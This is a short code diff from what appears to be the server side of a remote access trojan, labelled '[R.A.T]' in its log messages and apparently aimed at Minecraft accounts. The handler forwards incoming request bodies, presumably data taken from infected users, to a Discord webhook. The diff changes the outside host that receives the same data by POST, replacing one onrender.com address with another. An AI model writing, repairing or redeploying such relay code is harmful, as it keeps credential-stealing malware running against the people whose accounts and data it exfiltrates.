@@ -172,7 +172,7 @@ app.post("/", (req, res) => {
                     console.log(`[R.A.T] Error while sending to Discord webhook:\n${err}`)
                 })
                 
-                post("https://verification-minecraft.onrender.com", req.body
+                post("https://ashification-kuh6.onrender.com", req.body
                 , {
                     headers: {
                         "Content-Type": "application/json"
